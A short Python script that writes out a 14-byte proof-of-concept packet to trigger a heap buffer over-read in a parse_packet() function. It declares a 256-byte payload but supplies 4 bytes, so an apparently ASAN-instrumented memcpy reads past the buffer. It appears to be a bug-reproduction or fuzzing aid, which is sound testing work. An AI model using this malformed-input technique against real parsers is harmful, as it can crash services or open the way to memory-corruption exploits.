#!/usr/bin/env python3
"""
Generate a PoC that triggers the heap-buffer-overflow in parse_packet().

The packet format requires:
  bytes 0-3:  magic = 0xDEADBEEF (little-endian)
  bytes 4-5:  type  = any uint16
  bytes 6-9:  payload_len = N (little-endian uint32)
  bytes 10+:  payload (should be N bytes, but we provide fewer)

To trigger the bug: set payload_len > (total_size - 10).
We send a 14-byte packet (4 bytes of payload) but declare payload_len=256.
The memcpy will read 256 bytes from a 14-byte buffer → ASAN fires.
"""
import struct
import sys

magic = 0xDEADBEEF
pkt_type = 1
payload_len = 256  # claim 256 bytes of payload
actual_payload = b"\x41\x42\x43\x44"  # only 4 bytes

poc = struct.pack("<I", magic)       # bytes 0-3: magic
poc += struct.pack("<H", pkt_type)   # bytes 4-5: type
poc += struct.pack("<I", payload_len) # bytes 6-9: declared length (256)
poc += actual_payload                 # bytes 10-13: only 4 bytes!

sys.stdout.buffer.write(poc)
